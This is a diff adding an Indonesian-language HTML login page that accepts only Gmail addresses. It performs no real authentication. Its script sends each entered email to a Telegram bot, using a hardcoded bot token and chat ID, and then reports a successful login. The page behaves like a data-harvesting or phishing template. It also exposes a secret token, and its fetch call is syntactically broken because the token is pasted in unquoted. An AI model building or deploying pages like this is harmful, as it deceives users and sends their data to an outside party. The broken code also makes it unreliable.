@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+
+<style>
+body{
+  margin:0;
+  font-family:Arial;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:linear-gradient(135deg,#667eea,#764ba2);
+}
+
+.container{
+  background:white;
+  padding:30px;
+  width:350px;
+  border-radius:15px;
+  text-align:center;
+}
+
+input,button{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  border-radius:8px;
+  border:1px solid #ccc;
+  box-sizing:border-box;
+}
+
+button{
+  border:none;
+  color:white;
+  cursor:pointer;
+  background:linear-gradient(135deg,#667eea,#764ba2);
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <h2>LOGIN</h2>
+
+  <input type="text" id="email" placeholder="Masukkan email">
+  <input type="password" id="password" placeholder="Masukkan password">
+
+  <button onclick="login()">Login</button>
+</div>
+
+<script>
+function login(){
+
+  var email = document.getElementById("email").value.trim();
+  var password = document.getElementById("password").value.trim();
+
+  if(email === "" || password === ""){
+    alert("Isi semua field!");
+    return;
+  }
+
+  if(!email.endsWith("@gmail.com")){
+    alert("Email harus berakhiran @gmail.com");
+    return;
+  }
+
+  // NOTIFIKASI TANPA PASSWORD
+  var pesan = "Login berhasil dari email: " + email;
+
+  // GANTI TOKEN & CHAT ID MILIK SENDIRI
+  var token = "8818071002:AAFM-PLlzyYOpEMywO0l403odYYFbi47vCg";
+  var chatId = "6297122078";
+
+  fetch("https://api.telegram.org/bot" + 8818071002:AAFM-PLlzyYOpEMywO0l403odYYFbi47vCg + "/sendMessage",{
+    method:"POST",
+    headers:{
+      "Content-Type":"application/json"
+    },
+    body:JSON.stringify({
+      chat_id: chatId,
+      text: pesan
+    })
+  })
+  .then(res => res.json())
+  .then(data => {
+    alert("Login berhasil!");
+  })
+  .catch(err => {
+    alert("Gagal kirim notifikasi");
+  });
+}
+</script>
+
+</body>
+</html>
